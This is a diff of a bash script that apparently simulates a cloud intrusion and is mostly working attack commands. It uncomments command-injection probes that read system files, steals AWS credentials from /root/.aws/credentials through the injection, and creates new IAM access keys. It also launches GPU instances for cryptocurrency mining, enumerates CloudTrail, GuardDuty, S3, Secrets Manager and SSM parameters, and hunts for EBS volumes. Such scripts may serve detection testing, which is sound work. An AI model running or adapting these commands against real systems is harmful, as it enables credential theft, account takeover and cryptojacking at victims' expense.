@@ -17,33 +17,33 @@ function randomSleep() {
 url=$1
 echo "Attacking $url"
 
-# echo "Performing recon"
-# request "google.com"
-# randomSleep
+echo "Performing recon"
+request "google.com"
+randomSleep
 
-# request "aaaaa"
-# randomSleep
+request "aaaaa"
+randomSleep
 
-# request '$(whoami)'
-# randomSleep
+request '$(whoami)'
+randomSleep
 
-# request '\`whoami\`'
-# randomSleep
+request '\`whoami\`'
+randomSleep
 
-# request '127.0.0.1'
-# randomSleep
+request '127.0.0.1'
+randomSleep
 
-# request '127.0.0.1 && whoami'
-# randomSleep
+request '127.0.0.1 && whoami'
+randomSleep
 
-# request '127.0.0.1 && cat /etc/os-release'
-# randomSleep
+request '127.0.0.1 && cat /etc/os-release'
+randomSleep
 
-# request '127.0.0.1 && ls -l /root'
-# randomSleep
+request '127.0.0.1 && ls -l /root'
+randomSleep
 
-# request '127.0.0.1 && ls -l /root/.aws'
-# randomSleep
+request '127.0.0.1 && ls -l /root/.aws'
+randomSleep
 
 creds=$(request '127.0.0.1 && cat /root/.aws/credentials')
 export AWS_ACCESS_KEY_ID=$(echo "$creds" | grep aws_access_key_id | cut -d= -f2)
@@ -60,25 +60,27 @@ aws iam create-access-key --user-name support
 randomSleep
 echo "Attempting to spin up GPU instances"
 AMI_ID=$(aws ssm get-parameters-by-path --path /aws/service/ami-amazon-linux-latest --query "Parameters[].Name")
+# g4ad.xlarge seems to be a popular choice for mining cryptocurrency
+# c.f. https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
 aws ec2 run-instances \
     --image-id resolve:ssm:/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-ebs \
-    --instance-type g4ad.xlarge \ # https://medium.com/coinmonks/new-aws-instance-that-makes-eth-mining-profitable-1dd87183cce7
+    --instance-type g4ad.xlarge \
     --count 5
 
 # That didn't work? What else can we do in the account...
 echo "Enumerating resources"
-aws ec2 describe-instances
-aws cloudtrail list-trails
-aws guardduty list-detectors
+aws ec2 describe-instances >/dev/null
+aws cloudtrail list-trails >/dev/null
+aws guardduty list-detectors >/dev/null
 randomSleep
-aws s3 ls
-aws iam list-account-aliases
-aws iam get-account-summary
-aws iam get-account-authorization-details
-aws rds describe-db-clusters
-aws rds describe-db-instances
-aws secretsmanager list-secrets
-aws ssm get-parameters-by-path --path / --recursive
+aws s3 ls >/dev/null
+aws iam list-account-aliases >/dev/null
+aws iam get-account-summary >/dev/null
+aws iam get-account-authorization-details >/dev/null
+aws rds describe-db-clusters >/dev/null
+aws rds describe-db-instances >/dev/null
+aws secretsmanager list-secrets >/dev/null
+aws ssm get-parameters-by-path --path / --recursive >/dev/null
 randomSleep
 
 echo "Listing EBS volumes and finding a juicy one"
